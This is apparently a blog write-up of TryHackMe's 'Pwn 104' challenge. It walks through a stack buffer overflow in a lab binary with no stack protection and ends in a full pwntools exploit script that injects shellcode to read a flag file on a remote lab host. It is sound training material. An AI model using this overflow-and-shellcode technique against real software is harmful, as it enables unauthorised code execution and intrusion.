---
author: pl4int3xt
layout: post
title: Pwn 104 - Tryhackme
date: '2024-01-19'
description: "Beginner level binary exploitation challenges from Tryhackme"
categories: [Pwn 101]
tags: [binary exploitation, Tryhackme]
---

Let's download the task file and decompile the binary with ghidra. `main()` has a buffer overflow in the read since `local_58` is set to 80 but `read()` reads 200 characters which are more than 80. The binary also leaks the location of the buffer.

```c
void main(void){
  undefined local_58 [80];
  
  setup();
  banner();
  puts(&DAT_00402120);
  puts(&DAT_00402148);
  puts(&DAT_00402170);
  printf("I\'m waiting for you at %p\n",local_58);
  read(0,local_58,200);
  return;
}
```

Running checksec we notice that NX (No Execute) bit is disabled meaning that stored input or data can be executed as code.
>  All we need to do is to get the offset
> * leak the buffer location 
> * subtract the length of our shellcode from the offset to create some space for our shellcode.
> * Finally call the buffer location to execute the shellcode

```shell
pl4int3xt@archlinux ~/D/p/pwn104> checksec --file=pwn104.pwn104
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   46 Symbols	 No	pwn104.pwn104
```

Let's open pwndbg with our binary and try to crash it

```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/pl4int3xt/Documents/pwn/pwn104/pwn104.pwn104 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7fffffffe610
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040124e in main ()
```

Finally let's get our offset

```shell
pwndbg> cyclic -l laaaaaaa
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
```

Let's craft our python code

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './pwn104.pwn104'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# Start the executable
io = start()

# How many bytes to the instruction pointer (RIP)?
padding = 88

io.recvuntil(b'at ') # program leaks the buffer location and we need to get it
address = io.recvline() 
bufferLocation = p64(int(address, 16))

shellcode = asm(shellcraft.cat('flag.txt'))
shellcode += asm(shellcraft.exit())

payload = flat(
    shellcode,
    asm('nop') * (padding - len(shellcode)),
    bufferLocation
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline(payload)

# Receive the flag
io.interactive()
```

Let's run our code and get the flag

```shell
pl4int3xt@archlinux ~/D/p/pwn104> python3 pwn104.py REMOTE 10.10.135.73 9004
[+] Opening connection to 10.10.135.73 on port 9004: Done
[*] Switching to interactive mode
THM{REDACTED ..}
[*] Got EOF while reading in interactive
$ 
```